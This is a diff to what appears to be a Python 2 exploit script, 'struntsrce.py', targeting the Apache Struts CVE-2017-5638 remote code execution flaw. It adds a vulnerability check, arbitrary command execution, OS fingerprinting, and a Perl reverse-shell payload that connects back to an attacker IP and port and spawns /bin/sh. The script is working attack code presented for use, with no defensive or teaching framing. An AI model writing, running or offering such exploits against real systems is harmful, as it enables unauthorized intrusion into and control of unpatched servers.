@@ -13,6 +13,8 @@
 
 """
 Usage:
+    struntsrce.py --target=<arg> --test
+    struntsrce.py --target=<arg> --cmd=<arg>
     struntsrce.py --target=<arg> --ip=<arg> --port=<arg>
     struntsrce.py --help
     struntsrce.py --version
@@ -22,6 +24,8 @@ Options:
     -v --version                             Show version
 Required options:
     --target='url target'                    your target :)
+    --test                                   check if target is vulnerable or not
+    --cmd='uname -a'                         your command to execute in target
     --ip='10.10.10.1'                        your ip
     --port=4444                              open port for back connection
 
@@ -36,19 +40,19 @@ from docopt import docopt, DocoptExit
 
 class CVE_2017_5638():
 
-    def __init__(self, p_target, p_ip, p_port):
+    def __init__(self, p_target):
         self.target = p_target
-        self.ip = p_ip
-        self.port = p_port
-        self.exploit()
+    #    self.ip = p_ip
+    #    self.port = p_port
+    #    self.exploit()
 
-    def generate_revshell(self):
+    def generate_revshell(self, p_ip, p_port):
         revshell = "perl -e \\'use Socket;$i=\"{0}\";$p={1};"\
                    "socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"\
                    "if(connect(S,sockaddr_in($p,inet_aton($i)))){{open"\
                    "(STDIN,\">&S\");open(STDOUT,\">&S\");"\
                    "open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};\\'"
-        return revshell.format(self.ip, self.port)
+        return revshell.format(p_ip, p_port)
 
     def generate_payload(self, p_cmd):
         payload = "%{{(#_='multipart/form-data')."\
@@ -92,30 +96,69 @@ class CVE_2017_5638():
             body = urllib2.urlopen(xpl).read()
         except httplib.IncompleteRead as b:
             body = b.partial
+        except:
+            pass
         return body
 
+    def os_detect(self):
+        cmds = ['dir', 'uname']
+        for cmd in cmds:
+            resp = self.send_xpl(self.generate_payload(cmd))
+            if '<DIR>' in resp:
+                print '[+] Windows OS system detected.'
+                break
+            elif 'Linux' in resp or 'Darwin' in resp:
+                print '[+] Unix-like OS system detected.\n'
+                break
 
-    def exploit(self):
-        cmd = 'echo hacked'
+    def test_vuln(self):
+        cmd = 'ls'
+        print '\n[+] Testing ' + self.target
         resp = self.send_xpl(self.generate_payload(cmd))
-        if 'hacked' in resp:
-            print '\n[+] Target vulnerable!!..'
-            print '[+] Attempting reverse connection.. '\
-                  'Make sure you open port:'\
-                  ' $ nc -lnvp <port>'
-            self.send_xpl(self.generate_payload(self.generate_revshell()))
-        
+        tags = ['<html', '<head', '<body', '<script', '<div']
+        if any(tag not in resp.lower() for tag in tags):
+            print '[+] Target possibly vulnerable'
+            print '[+] Finger printing OS system..'
+            self.os_detect()
+        else:
+            print '[-] Target not vulnerable\n'
+            sys.exit(0)
+
+    def exec_cmd(self, p_cmd):
+        print '\n[+] Target: {0}'.format(self.target)
+        print '[+] Executing: {0}\n\n'.format(p_cmd)
+        resp = self.send_xpl(self.generate_payload(p_cmd))
+        print resp
+
+    def exec_revshell(self, p_ip, p_port):
+        print '\n[+] Target: {0}'.format(self.target)
+        print '[+] Dont forget to listen on port: {0}'.format(p_port)
+        print '[+] Attempting reverse shell...\n'
+
+        self.send_xpl(self.generate_payload(
+            self.generate_revshell(p_ip, p_port)))
+
+
 def main():
     try:
         arguments = docopt(__doc__, version="Apache Strunts RCE Exploit")
         target = arguments['--target']
+        test = arguments['--test']
+        cmd = arguments['--cmd']
         ip = arguments['--ip']
         port = arguments['--port']
+
     except DocoptExit as e:
         os.system('python struntsrce.py --help')
         sys.exit(1)
 
-    CVE_2017_5638(target, ip, port)
+    x = CVE_2017_5638(target)
+    if test:
+        x.test_vuln()
+    if cmd:
+        x.exec_cmd(cmd)
+    if ip and port:
+        x.exec_revshell(ip, port)
 
 
 if __name__ == '__main__':
